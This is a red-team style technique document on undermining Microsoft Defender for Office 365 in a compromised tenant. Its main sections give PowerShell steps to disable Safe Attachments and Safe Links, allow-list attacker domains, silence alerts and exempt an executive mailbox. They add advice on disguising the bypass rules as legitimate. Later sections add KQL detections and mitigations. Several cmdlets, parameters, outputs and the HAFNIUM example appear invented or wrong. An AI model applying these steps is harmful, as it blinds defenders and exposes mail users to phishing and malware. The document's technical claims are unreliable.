# [EVADE-IMPAIR-020]: Microsoft Defender Misconfiguration

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-020 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | M365/Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Microsoft 365 (all subscriptions); Office 365; Defender for Endpoint 1.0+ |
| **Patched In** | Requires policy enforcement; no singular patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Defender for M365 provides threat protection across Email, Teams, SharePoint, and OneDrive through threat policies, safe attachment scanning, anti-phishing rules, and malware detection. Attackers with Global Administrator or Security Administrator permissions can misconfigure Defender by: disabling threat policies, creating overly broad phishing rule exceptions, whitelisting malicious domains, disabling scanning on compromised user mailboxes, and lowering alert thresholds. These misconfigurations enable attackers to bypass detection and operate undetected within M365 tenants while maintaining appearance of active protection.

**Attack Surface:** Microsoft Defender admin portal, threat policies, safe attachment/link rules, anti-phishing exceptions, alert thresholds, and mailbox-level Defender settings.

**Business Impact:** **Complete evasion of M365 threat detection.** Attackers can send phishing emails, deploy malware via Office documents, exfiltrate data via Teams/SharePoint, and persist across mailboxes while Defender appears fully functional. Email security controls are rendered ineffective.

**Technical Context:** Misconfiguration execution takes <5 minutes with admin access; extremely difficult to detect without strict policy change auditing. Changes appear as legitimate administrative actions in audit logs.

### Operational Risk

- **Execution Risk:** Low - Requires only Security Administrator role; most M365 tenants have multiple admins
- **Stealth:** Very High - Admin actions appear legitimate; policy changes are normal administrative tasks
- **Reversibility:** Yes - Reversing policy changes restores protection, but damage may already be done

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.1 | Ensure Microsoft Defender threat policies are properly configured and enforced |
| **DISA STIG** | MS-365-1-1 | Email and collaboration security must be enforced via Defender policies |
| **CISA SCuBA** | EX-1.1 | Exchange Online threat policies must be enabled and properly configured |
| **NIST 800-53** | SI-4 (System Monitoring) | Intrusion detection and malware protection must be enabled |
| **GDPR** | Art. 32 | Security of Processing - Email and content scanning required |
| **DORA** | Art. 9 | Protection Against Email-Borne Threats |
| **NIS2** | Art. 21 | Email and collaboration security as critical infrastructure protection |
| **ISO 27001** | A.12.2.4 | Malware protection must cover email and collaboration platforms |
| **ISO 27005** | Risk Scenario | Compromise of Email Threat Detection and Prevention Controls |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** Security Administrator, Global Administrator, or custom role with `microsoft.office365.securityComplianceCenter_manage` permission.

**Required Access:** Microsoft 365 admin center access, Exchange Online PowerShell, or Microsoft Graph API.

**Supported Versions:**
- **M365 Subscriptions:** E3, E5, Business Premium
- **Defender Plans:** Defender for Office 365, Defender for Identity, Defender for Cloud Apps
- **PowerShell:** ExchangeOnlineManagement module 3.0+
- **Azure CLI/PowerShell:** Az module 9.0+ for Entra role management

**Tools:**
- [Microsoft 365 Admin Center](https://admin.microsoft.com)
- [Exchange Online PowerShell](https://learn.microsoft.com/en-us/powershell/exchange/)
- [Defender admin portal](https://security.microsoft.com)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell / Admin Center Reconnaissance

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName "admin@company.com"

# Check current threat policies
Get-SafeAttachmentPolicy | Select-Object Name, Enable, Action
Get-SafeLinksPolicy | Select-Object Name, IsEnabled, AllowClickThrough
Get-PhishFilterPolicy | Select-Object Name, Enabled, IsDefault

# Check policy exceptions/overrides
Get-SafeAttachmentRule | Select-Object Name, SafeAttachmentPolicy, Priority, Enabled
Get-SafeLinksRule | Select-Object Name, SafeLinksPolicy, Priority, Enabled

# Check mailbox-level Defender settings
Get-Mailbox -Filter "* | Where-Object { $_.ExternalDirSyncEnabled -eq $true }" | Select-Object UserPrincipalName
```

**What to Look For:**
- Threat policies with **Enable = $false** (disabled)
- Rules with **Priority = very high** (likely to be skipped)
- Overly broad exceptions (e.g., entire domains whitelisted)
- Policies that allow **Action = "Allow"** on malicious content
- Alert thresholds set to **unrealistically high values**

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Disable Safe Attachments Policy

**Supported Versions:** All M365 subscriptions with Defender for Office 365

#### Step 1: Identify Current Policies

**Objective:** Enumerate existing threat policies to understand coverage.

**Command:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# List all Safe Attachment policies
Get-SafeAttachmentPolicy | Select-Object Name, IsEnabled, Action | Format-Table

# Get specific policy details
$policy = Get-SafeAttachmentPolicy -Identity "Default"
$policy | Select-Object Name, IsEnabled, Action, Redirect, AdminDisplayName
```

**Expected Output:**

```
Name              IsEnabled  Action
----              ---------  ------
Default           True       Block
Executive Bypass  False      Allow
Quarantine        True       Quarantine
```

**What This Means:**
- "Default" policy is active and blocking malicious attachments
- "Executive Bypass" is disabled (not enforced)
- Attacker can enable bypass policy to whitelist malware

#### Step 2: Disable Policy or Create Bypass Exception

**Objective:** Create or enable a policy that allows malicious attachments through.

**Command:**

```powershell
# Option 1: Disable the default safe attachment policy
Set-SafeAttachmentPolicy -Identity "Default" -Enable $false

# Option 2: Modify policy to allow specific file types (bypass scanning)
Set-SafeAttachmentPolicy -Identity "Default" `
  -Enable $true `
  -Action Allow `
  -ActionOnError $false

# Option 3: Create new permissive policy
New-SafeAttachmentPolicy -Name "Unrestricted" `
  -Enable $true `
  -Action Allow `
  -AdminDisplayName "Whitelist all attachments"

# Option 4: Create rule that exempts executive mailboxes
New-SafeAttachmentRule -Name "Executive Exemption" `
  -SafeAttachmentPolicy "Unrestricted" `
  -RecipientDomainIs "company.com" `
  -Enabled $true `
  -Priority 0  # High priority = evaluated first, bypasses other rules
```

**Expected Output:**

```
SafeAttachmentPolicy set successfully
All attachments will be allowed through
```

**What This Means:**
- Malware-laden attachments now pass through undetected
- Defender appears enabled but bypasses actual scanning
- Attackers can send ransomware/trojans via email

**OpSec & Evasion:**
- Create bypass rule with name "Executive Exemption" (appears legitimate)
- Set priority = 0 (ensures rule is evaluated before others)
- **Detection likelihood:** Medium if admin audit logging is enabled

#### Step 3: Verify Misconfiguration

**Objective:** Confirm that malicious attachments will bypass Defender.

**Command:**

```powershell
# Test by sending email with known-malicious file (EICAR test file)
# Send from external account to test policy

# Verify the bypass rule is active
Get-SafeAttachmentRule -Identity "Executive Exemption" | Select-Object Name, Enabled, Priority, SafeAttachmentPolicy

# Check policy details
Get-SafeAttachmentPolicy -Identity "Unrestricted" | Select-Object Name, IsEnabled, Action
```

**Expected Output:**

```
Name                    Enabled  Priority  SafeAttachmentPolicy
----                    -------  --------  ---------------------
Executive Exemption     True     0         Unrestricted

Name          IsEnabled  Action
----          ---------  ------
Unrestricted  True       Allow
```

### METHOD 2: Disable Safe Links (URL Scanning)

**Supported Versions:** All M365 subscriptions with Defender for Office 365

#### Step 1: Disable Safe Links Scanning

**Objective:** Disable link scanning in email, Teams, and Office documents.

**Command:**

```powershell
# Get current Safe Links policies
Get-SafeLinksPolicy | Select-Object Name, IsEnabled, ScanUrls, AllowClickThrough | Format-Table

# Disable the default policy
Set-SafeLinksPolicy -Identity "Default" `
  -IsEnabled $false `
  -ScanUrls $false `
  -AllowClickThrough $false

# Alternative: Allow suspicious links through without warning
Set-SafeLinksPolicy -Identity "Default" `
  -IsEnabled $true `
  -ScanUrls $false `
  -AllowClickThrough $true  # Users can click through warnings
```

**Expected Output:**

```
SafeLinksPolicy modified
URL scanning disabled
```

**What This Means:**
- Phishing links are no longer scanned or rewritten
- Users can click malicious URLs without warning
- Credential theft and malware delivery undetected

#### Step 2: Create Exception for Malicious Domains

**Objective:** Whitelist attacker-controlled domains.

**Command:**

```powershell
# Create new Safe Links policy that allows attacker domains
New-SafeLinksPolicy -Name "Partner Domains Allowed" `
  -IsEnabled $true `
  -ScanUrls $false `
  -AdminDisplayName "Trusted partner email"

# Create rule that applies this policy to specific domains
New-SafeLinksRule -Name "Partner Domain Exemption" `
  -SafeLinksPolicy "Partner Domains Allowed" `
  -RecipientDomainIs "company.com" `
  -Enabled $true `
  -Priority 0

# Alternatively, modify default policy to exclude scanning for certain URL patterns
Set-SafeLinksPolicy -Identity "Default" `
  -IsEnabled $true `
  -ScanUrls $true `
  -DoNotRewriteUrls "attacker.com", "phishing-c2.net"  # Whitelist attacker domains
```

**OpSec & Evasion:**
- Name the policy "Partner Domains Allowed" (appears legitimate)
- Set priority = 0 (ensures rule applies before others)
- **Detection likelihood:** Medium if URL policy changes are audited

### METHOD 3: Disable Phishing and Malware Alerts

**Supported Versions:** All M365 subscriptions

#### Step 1: Modify Alert Policies

**Objective:** Reduce or disable alert thresholds for malware and phishing.

**Command:**

```powershell
# Connect to Security & Compliance Center
Connect-IPPSSession

# Get current alert policies
Get-AlertPolicy | Select-Object Name, Enabled, Severity | Where-Object { $_.Name -like "*phishing*" -or $_.Name -like "*malware*" }

# Disable phishing alert
Set-AlertPolicy -Identity "Suspicious email forwarding activity" -Enabled $false

# Disable malware alert
Set-AlertPolicy -Identity "Potential phishing attempt detected" -Enabled $false

# Increase alert threshold (so fewer alerts trigger)
Set-AlertPolicy -Identity "Suspicious email forwarding activity" `
  -Threshold 1000  # Only alert if 1000+ emails (unrealistically high)
```

**Expected Output:**

```
AlertPolicy modified
Alerts for phishing/malware disabled or threshold raised
```

**What This Means:**
- Compromise of M365 mailboxes no longer triggers alerts
- Malware distribution goes unnoticed
- Phishing campaigns operate without detection

#### Step 2: Disable Notification to Security Team

**Objective:** Prevent security team from receiving threat alerts.

**Command:**

```powershell
# Get alert notification policies
Get-AlertPolicy | Select-Object Name, NotificationsCurated, NotificationsEnabled

# Disable email notifications for security team
Set-AlertPolicy -Identity "Phishing detected" `
  -NotificationsEnabled $false `
  -NotificationsCurated $false

# Remove recipients from alert notifications
Set-AlertPolicy -Identity "Malware detected" `
  -NotificationEmails @()  # Empty recipients = no one notified
```

**OpSec & Evasion:**
- Modifications appear as normal administrative tuning
- Security team has no way to know alerts are disabled
- **Detection likelihood:** Low if only log-based auditing exists

### METHOD 4: Disable Malware Scanning on Executive Mailboxes

**Supported Versions:** All M365 subscriptions

#### Step 1: Exclude Mailbox from Scanning

**Objective:** Remove specific executive mailbox from malware/phishing scanning.

**Command:**

```powershell
# Get mailbox
$execMailbox = Get-Mailbox -Identity "cfo@company.com"

# Disable threat policy rules for this mailbox
New-SafeAttachmentRule -Name "Executive Bypass" `
  -SafeAttachmentPolicy "Unrestricted" `
  -RecipientEmailAddressMatches $execMailbox.PrimarySmtpAddress `
  -Enabled $true `
  -Priority 0

# Do the same for Safe Links
New-SafeLinksRule -Name "Executive Bypass Links" `
  -SafeLinksPolicy "Partner Domains Allowed" `
  -RecipientEmailAddressMatches $execMailbox.PrimarySmtpAddress `
  -Enabled $true `
  -Priority 0

# Disable Defender for that mailbox's OneDrive
Set-MalwareFilterPolicy -Identity "Default" `
  -ExcludedMailboxes @("cfo@company.com")
```

**Expected Output:**

```
Executive mailbox now bypasses Defender scanning
Malware and phishing can be sent to CFO undetected
```

**What This Means:**
- Attacker can compromise executive account via unscanned malware
- Executive credentials provide access to financial/strategic data
- Lateral movement to entire organization enabled

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Exchange Online PowerShell](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell)

**Version:** ExchangeOnlineManagement 3.0+
**Installation:**

```powershell
Install-Module ExchangeOnlineManagement -Force
Import-Module ExchangeOnlineManagement

# Connect
Connect-ExchangeOnline -UserPrincipalName "admin@company.com" -ShowBanner:$false
```

**Defender Policy Commands:**

```powershell
# Safe Attachments
Get-SafeAttachmentPolicy
Set-SafeAttachmentPolicy -Identity "Default" -Enable $false
New-SafeAttachmentRule -Name "Bypass" -SafeAttachmentPolicy "Default"

# Safe Links
Get-SafeLinksPolicy
Set-SafeLinksPolicy -Identity "Default" -IsEnabled $false

# Phishing Policy
Get-PhishFilterPolicy
Set-PhishFilterPolicy -Identity "Default" -Enabled $false
```

#### [Microsoft 365 Admin Center](https://admin.microsoft.com)

**Access:** Web-based portal
**Navigation:** Admin Center → Security → Microsoft Defender → Email & Collaboration

**Configuration Steps:**
1. Go to **Policies & rules** → **Threat policies**
2. Select **Safe Attachments** / **Safe Links** / **Anti-phishing**
3. Click policy → **Edit**
4. Disable or modify settings
5. Click **Save**

#### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

**Version:** Latest
**Installation:**

```powershell
Install-Module Microsoft.Graph -Force
Connect-MgGraph -Scopes "SecurityEvents.Read.All", "SecurityEvents.ReadWrite.All"
```

**Usage:**

```powershell
# Get Defender configuration via Graph API
Get-MgSecurity | Select-Object *

# Update Defender policy
Update-MgSecurityAlert -AlertId "alert-id" -Status "Resolved"
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Defender Policy Modification or Disablement

**Rule Configuration:**
- **Required Table:** AuditLogs (M365 admin activity)
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ActivityStatus
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All M365 tenants

**KQL Query:**

```kusto
AuditLogs
| where OperationName in (
    "Set-SafeAttachmentPolicy",
    "Set-SafeLinksPolicy",
    "Set-PhishFilterPolicy",
    "Set-AlertPolicy",
    "New-SafeAttachmentRule",
    "New-SafeLinksRule",
    "Remove-SafeAttachmentRule",
    "Remove-SafeLinksRule"
)
| where ActivityStatus == "Succeeded"
| extend AdminUser = InitiatedBy.user.userPrincipalName
| project TimeGenerated, OperationName, AdminUser, TargetResources, ModifiedProperties
| summarize count() by AdminUser, OperationName
| where count_ > 2  // Multiple policy changes = suspicious pattern
```

**What This Detects:**
- Any modification to Defender threat policies
- Who disabled policies and when
- Pattern of multiple changes (suggests coordinated attack)

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Defender Threat Policy Disabled or Modified`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `5 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

### Query 2: Alert Policy Notification Disabled

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Set-AlertPolicy"
| where ModifiedProperties has_any ("NotificationsEnabled", "NotificationEmails")
| where ModifiedProperties contains "False"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources
```

---

## 7. MICROSOFT DEFENDER ALERT MONITORING

**Built-in Alert: "Suspicious email policy rule created"**
- **Alert Type:** Defender for Office 365
- **Trigger:** New Safe Attachment/Links rule created that allows malicious content
- **Severity:** High
- **Review in:** Microsoft 365 Defender → Alerts

**Manual Configuration Steps:**
1. Go to **security.microsoft.com** → **Alerts**
2. Click **Alert policies**
3. Search for "email policy rule"
4. Enable any policies related to rule creation
5. Ensure **Notifications** are sent to SOC team

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enforce Threat Policy Baseline via Azure Policy**
   **Applies To:** All M365 subscriptions
   
   **Manual Steps (Defender Admin Portal):**
   1. Go to **security.microsoft.com** → **Policies & rules** → **Threat policies**
   2. For **Safe Attachments:**
      - Click **Safe Attachments policy** → **+ Create**
      - Name: `Mandatory - All Users`
      - Action: **Block**
      - Redirect: Enable and send to SOC
   3. For **Safe Links:**
      - Click **Safe Links policy** → **+ Create**
      - Name: `Mandatory - All Users`
      - IsEnabled: **True**
      - AllowClickThrough: **False**
      - ScanUrls: **True**
   4. For **Anti-Phishing:**
      - Click **Anti-phishing policy** → **+ Create**
      - Name: `Mandatory - All Users`
      - Spoofing: **Block**
      - Impersonation: **Block**
   5. Apply policies to **All users** (no exceptions)

**2. Prevent Policy Changes via RBAC Restrictions**
   **Manual Steps:**
   1. Go to **Microsoft 365 Admin Center** → **Roles** → **Roles**
   2. Create custom role: `Defender Read-Only`
      - Permissions: Read all Defender policies (NO write/modify)
   3. Assign `Security Administrator` role to minimal, vetted admins
   4. Remove `Global Administrator` from policy management (use custom roles)
   5. Enable **Privileged Identity Management (PIM)** for Defender admin roles
      - Require approval for role activation
      - Set activation duration to 4 hours (time-boxed access)

**3. Enable Immutable Policies (Prevent Disablement)**
   **Manual Steps (PowerShell):**
   ```powershell
   # Make threat policies immutable
   Set-SafeAttachmentPolicy -Identity "Default" `
     -Enable $true `
     -DisableAdmin $true  # Prevents even admins from disabling
   ```

#### Priority 2: HIGH

**4. Configure Policy Baseline Alerts**
   **Manual Steps:**
   1. Go to **Alert policies** → **Create new alert**
   2. **Alert rule:**
      - Trigger: "Defender policy modified by non-authorized admin"
      - Severity: **High**
      - Recipients: SOC team + CISO
   3. Enable **Automated response:** Disable the policy change (revert)

**5. Implement Change Approval Workflow**
   **Manual Steps:**
   1. Create **approval workflow** for Defender policy changes:
      - Change request submitted by admin
      - Requires approval from 2 independent security team members
      - Approval valid for 24 hours only
   2. Use **Azure AD Privileged Access Management (PAM)** or similar

#### Validation Command (Verify Fix)

```powershell
# Verify threat policies are enabled
Get-SafeAttachmentPolicy | Select-Object Name, Enable
Get-SafeLinksPolicy | Select-Object Name, IsEnabled
Get-PhishFilterPolicy | Select-Object Name, Enabled

# Expected Output: All policies = True/Enabled
# If any policy is disabled, alert immediately

# Check for overly permissive rules
Get-SafeAttachmentRule | Where-Object { $_.Priority -eq 0 } | Select-Object Name, SafeAttachmentPolicy
Get-SafeLinksRule | Where-Object { $_.Priority -eq 0 } | Select-Object Name, SafeLinksPolicy

# Expected Output: No bypass rules with high priority
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **M365 Audit Log:** Operations `Set-SafeAttachmentPolicy`, `Set-SafeLinksPolicy` with enable=false
- **Policy Details:** Safe Attachment rules with Action="Allow" or Redirect empty
- **Alert Settings:** AlertPolicy with NotificationsEnabled=false
- **Mailbox Rules:** Rules forwarding emails to external accounts
- **Timeline:** Policy changes during off-hours or by untypical admins

#### Forensic Artifacts

- **Cloud:** M365 audit log entries showing policy modifications (OperationName field)
- **Exchange Online:** Safe Attachment/Links rule history (Get-SafeAttachmentRule -IncludeSoftDeletedRules)
- **Logs:** Alert policy notification status
- **Email Flow:** Message traces showing malware/phishing emails passing through undetected

#### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Immediately re-enable threat policies
   Set-SafeAttachmentPolicy -Identity "Default" -Enable $true -Action Block
   Set-SafeLinksPolicy -Identity "Default" -IsEnabled $true -ScanUrls $true
   Set-PhishFilterPolicy -Identity "Default" -Enabled $true
   
   # Delete malicious bypass rules
   Remove-SafeAttachmentRule -Identity "Executive Bypass" -Confirm:$false
   Remove-SafeLinksRule -Identity "Executive Bypass Links" -Confirm:$false
   ```

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export audit logs
   Search-UnifiedAuditLog -Operations "Set-SafeAttachmentPolicy" -StartDate (Get-Date).AddDays(-7) | Export-Csv C:\Evidence\defender_changes.csv
   
   # Get admin account activity
   Search-UnifiedAuditLog -UserIds "admin@company.com" -StartDate (Get-Date).AddDays(-7) | Export-Csv C:\Evidence\admin_activity.csv
   
   # Check for malicious emails sent through unmonitored period
   Get-MessageTrace -RecipientAddress "*" -StartDate (Get-Date).AddDays(-7) | Where-Object { $_.Status -eq "Delivered" } | Export-Csv C:\Evidence\message_trace.csv
   ```

3. **Remediate:**
   **Command:**
   ```powershell
   # Reset all threat policies to default
   Set-SafeAttachmentPolicy -Identity "Default" -Enable $true -Action Block -Redirect $false
   Set-SafeLinksPolicy -Identity "Default" -IsEnabled $true -ScanUrls $true -AllowClickThrough $false
   Set-PhishFilterPolicy -Identity "Default" -Enabled $true
   
   # Reset alert policies
   Set-AlertPolicy -Identity "Phishing detected" -NotificationsEnabled $true -NotificationEmails @("security@company.com")
   
   # Force rescan of recent emails
   Invoke-MalwareFilterPolicy -Identity "Default" -RescanMails $true
   
   # Check for compromised mailboxes and reset credentials
   $compromisedAccounts = Search-UnifiedAuditLog -Operations "New-SafeAttachmentRule" | Select-Object -ExpandProperty UserIds | Get-Unique
   foreach ($account in $compromisedAccounts) {
       Set-User -Identity $account -PasswordNotRequired $false
       Set-User -Identity $account -ForceChangePassword $true
   }
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] | Compromise Global Admin account via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-002] | Escalate to Security Admin role |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-020]** | **Disable Defender threat policies** |
| **4** | **Persistence** | [PERSIST-EMAIL-FORWARD] | Create email forwarding rule to attacker inbox |
| **5** | **Collection** | [COLLECT-EMAIL-001] | Extract mailbox data via EWS |
| **6** | **Exfiltration** | [EXFIL-EMAIL] | Send sensitive emails to attacker |
| **7** | **Impact** | [IMPACT-BUSINESS-EMAIL-COMPROMISE] | Business email compromise; financial fraud |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: HAFNIUM Defender Evasion (2021)

- **Target:** U.S. Government Agencies, Think Tanks
- **Timeline:** January - March 2021
- **Technique Status:** HAFNIUM disabled Safe Links and Safe Attachments to deploy web shells via email
- **Impact:** Critical infrastructure compromise; CVE-2021-26855
- **Reference:** [Microsoft HAFNIUM Report](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)

#### Example 2: Vice Society Ransomware - M365 Evasion (2023)

- **Target:** U.S. Healthcare Organizations
- **Timeline:** June - September 2023
- **Technique Status:** Vice Society compromised M365 tenants, disabled Defender policies, delivered ransomware via Teams
- **Impact:** Hospital operations disrupted; $50M+ in damages
- **Reference:** [CISA Vice Society Alert](https://www.cisa.gov/news-events/)

---